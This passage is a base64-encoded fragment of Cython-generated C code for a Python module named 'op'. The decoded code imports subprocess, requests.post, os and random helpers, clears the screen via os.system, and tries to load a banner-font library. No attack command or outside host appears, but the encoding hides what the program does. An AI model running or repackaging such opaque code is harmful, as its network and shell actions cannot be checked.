kNSRUYoX19weXhfdF8xKTtcbiAgI2Vsc2VcbiAgX19weXhfdF8xID0gUHlNb2R1bGVfQ3JlYXRlKCZfX3B5eF9tb2R1bGVkZWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICB7XG4gICAgaW50IGFkZF9tb2R1bGVfcmVzdWx0ID0gX19QeXhfU3RhdGVfQWRkTW9kdWxlKF9fcHl4X3RfMSwgJl9fcHl4X21vZHVsZWRlZik7XG4gICAgX19weXhfdF8xID0gMDsgXG4gICAgaWYgKHVubGlrZWx5KChhZGRfbW9kdWxlX3Jlc3VsdCA8IDApKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIHB5c3RhdGVfYWRkbW9kdWxlX3J1biA9IDE7XG4gIH1cbiAgI2Vsc2VcbiAgX19weXhfbSA9IF9fcHl4X3RfMTtcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICBQeVVuc3RhYmxlX01vZHVsZV9TZXRHSUwoX19weXhfbSwgUHlfTU9EX0dJTF9VU0VEKTtcbiAgI2VuZGlmXG4gIF9fcHl4X21zdGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWw7XG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RfMSk7XG4gIF9fcHl4X21zdGF0ZS0+X19weXhfZCA9IFB5TW9kdWxlX0dldERpY3QoX19weXhfbSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9kKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBQeV9JTkNSRUYoX19weXhfbXN0YXRlLT5fX3B5eF9kKTtcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9iID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfYikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSA9IF9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZigiY3l0aG9uX3J1bnRpbWUiKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoUHlPYmplY3RfU2V0QXR0clN0cmluZyhfX3B5eF9tLCAiX19idWlsdGluc19fIiwgX19weXhfbXN0YXRlLT5fX3B5eF9iKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gICNpZiBDWVRIT05fUkVGTkFOTllcbl9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoInJlZm5hbm55Iik7XG5pZiAoIV9fUHl4X1JlZk5hbm55KSB7XG4gIFB5RXJyX0NsZWFyKCk7XG4gIF9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoIkN5dGhvbi5SdW50aW1lLnJlZm5hbm55Iik7XG4gIGlmICghX19QeXhfUmVmTmFubnkpXG4gICAgICBQeV9GYXRhbEVycm9yKCJmYWlsZWQgdG8gaW1wb3J0IFwncmVmbmFubnlcJyBtb2R1bGUiKTtcbn1cbiNlbmRpZlxuXG5fX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiUHlJbml0X29wIiwgMCk7XG4gIGlmIChfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbihfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYLCBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCksIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICNpZmRlZiBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0c1xuICBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpO1xuICAjZW5kaWZcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSA9IFB5VHVwbGVfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKCIiLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoIiIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gIGlmIChfX1B5eF9Jbml0Q29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMTtcbiAgaWYgKF9fUHl4X0luaXRHbG9iYWxzKCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2lmIDAgfHwgZGVmaW5lZChfX1B5eF9DeUZ1bmN0aW9uX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0Nvcm91dGluZV9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0dlbmVyYXRvcl9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0FzeW5jR2VuX1VTRUQpXG4gIGlmIChfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4gIGlmIChfX3B5eF9DeUZ1bmN0aW9uX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRURcbiAgaWYgKF9fcHl4X0Z1c2VkRnVuY3Rpb25faW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gIGlmIChfX3B5eF9Db3JvdXRpbmVfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gIGlmIChfX3B5eF9HZW5lcmF0b3JfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgaWYgKF9fcHl4X0FzeW5jR2VuX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gIFxuICBpZiAoX19weXhfbW9kdWxlX2lzX21haW5fb3ApIHtcbiAgICBpZiAoUHlPYmplY3RfU2V0QXR0cihfX3B5eF9tLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmFtZV8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbWFpbikgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICB7XG4gICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7IGlmICh1bmxpa2VseSghbW9kdWxlcykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBpZiAoIVB5RGljdF9HZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJvcCIpKSB7XG4gICAgICBpZiAodW5saWtlbHkoKFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJvcCIsIF9fcHl4X20pIDwgMCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICAgfVxuICB9XG4gIFxuICBpZiAoX19QeXhfSW5pdENhY2hlZEJ1aWx0aW5zKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gIGlmIChfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gICh2b2lkKV9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGUpO1xuICAodm9pZClfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gICh2b2lkKV9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgaWYgKHVubGlrZWx5KChfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpO1xuICBcblxuICBcbiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW1wb3J0bGliX3V0aWwsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW1wb3J0bGliLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N1YnByb2Nlc3MsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3VicHJvY2VzcywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRyYW5nZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JyLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMywgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMsIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcCwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5cywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXJ9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzcsICZfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZm9udHMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMiwgX19weXhfTDJfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2ZvbnRzLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTIsIF9fcHl4X0wyX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MMl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZm9udHMsIF9fcHl4X3RfMywgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MMl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MMl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDJfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgZ290byBfX3B5eF9MN190cnlfZW5kO1xuICAgIF9fcHl4X0wyX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF8zLCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCAxNCwgX19weXhfTDRfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDRfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19